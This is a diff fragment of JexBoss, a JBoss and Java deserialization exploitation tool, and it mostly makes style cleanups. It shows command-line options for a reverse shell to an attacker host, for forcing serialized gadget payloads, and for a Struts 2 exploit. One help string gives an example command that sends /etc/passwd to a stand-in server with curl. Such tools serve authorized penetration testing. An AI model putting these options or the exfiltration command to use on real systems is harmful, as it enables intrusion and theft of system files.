             print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
         elif gl_args.mode == 'auto-scan':
             print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
 
         print_and_flush(GREEN + " ---------------------------------------------------------------------------------\n"
-             +BOLD+   " Recommendations: \n" +ENDC+
-              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
+             + BOLD + " Recommendations: \n" + ENDC +
+              GREEN + " - Remove web consoles and services that are not used, eg:\n"
                       "    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war\n"
                       " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                       " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
@@ -1024,27 +1051,26 @@ def main():
     else:
         print_and_flush(GREEN + "\n\n * Results: \n" +
               "   The server is not vulnerable to bugs tested ... :D\n" + ENDC)
-    # infos
+    # info
     print_and_flush(ENDC + " * Info: review, suggestions, updates, etc: \n" +
           "   https://github.com/joaomatosf/jexboss\n")
 
     print_and_flush(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n" +
-          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" )
+          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n")
 
 
 print_and_flush(ENDC)
 
-#banner()
+# banner()
 
 
 if __name__ == "__main__":
 
-
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
+        # description="JexBoss v%s: JBoss verify and Exploitation Tool" %__version,
         description=textwrap.dedent(RED1 +
-               "\n # --- JexBoss: Jboss verify and EXploitation Tool  --- #\n"
+               "\n # --- JexBoss: Jboss verify and Exploitation Tool  --- #\n"
                  " |    And others Java Deserialization Vulnerabilities   | \n"
                  " |                                                      |\n"
                  " | @author:  João Filho Matos Figueiredo                |\n"
@@ -1090,9 +1116,9 @@ if __name__ == "__main__":
     parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
 
     parser.add_argument('--cookies', help="Specify cookies for Struts 2 Exploit. Use this to test features that require authentication. "
-                                         "Format: \"NAME1=VALUE1; NAME2=VALUE2\" (eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
-                        , type=str, metavar='NAME=VALUE')
-    #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)
+                                         "Format: \"NAME1=VALUE1; NAME2=VALUE2\" (eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\"",
+                        type=str, metavar='NAME=VALUE')
+    # parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)
 
     # advanced parameters ---------------------------------------------------------------------------------------
     group_advanced.add_argument("--reverse-host", "-r", help="Remote host address and port for reverse shell when exploiting "
@@ -1100,8 +1126,8 @@ if __name__ == "__main__":
                                                              "(for now, working only against *nix systems)"
                                                              "(eg. 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
     group_advanced.add_argument("--cmd", "-x",
-                                help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)"
-                                     , type=str, metavar='CMD')
+                                help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)",
+                                     type=str, metavar='CMD')
     group_advanced.add_argument("--dns", help="Specifies the dns query for use with \"dns\" Gadget", type=str, metavar='URL')
     group_advanced.add_argument("--windows", "-w", help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
                                 action='store_true')
@@ -1119,8 +1145,8 @@ if __name__ == "__main__":
                                 metavar='FILENAME')
     group_advanced.add_argument("--force", "-F",
                                 help="Force send java serialized gadgets to URL informed in -u parameter. This will "
-                                     "send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with "
-                                     "different Content-Types.",action='store_true')
+                                     "send the payload in multiple formats (eg. RAW, GZIPPED and BASE64) and with "
+                                     "different Content-Types.", action='store_true')
 
     # required parameters ---------------------------------------------------------------------------------------
     group_standalone.add_argument("-host", "-u", help="Host address to be checked (eg. -u http://192.168.0.10:8080)",
@@ -1143,9 +1169,9 @@ if __name__ == "__main__":
 
     if (gl_args.mode == 'standalone' and gl_args.host is None) or \
         (gl_args.mode == 'file-scan' and gl_args.file is None) or \
-        (gl_args.gadget == 'dns' and gl_args.dns is None):
+            (gl_args.gadget == 'dns' and gl_args.dns is None):
         banner()
-        print (help_usage())
+        print(help_usage())
         exit(0)
     else:
         configure_http_pool()
@@ -1154,7 +1180,8 @@ if __name__ == "__main__":
         banner()
         if gl_args.proxy and not is_proxy_ok():
             exit(1)
-        if gl_args.gadget == 'dns': gl_args.cmd = gl_args.dns
+        if gl_args.gadget == 'dns':
+            gl_args.cmd = gl_args.dns
         main()
 
 if __name__ == '__testing__':
@@ -1165,5 +1192,3 @@ if __name__ == '__testing__':
     timeout = Timeout(connect=1.0, read=3.0)
     gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
     _exploits.set_http_pool(gl_http_pool)
-
-
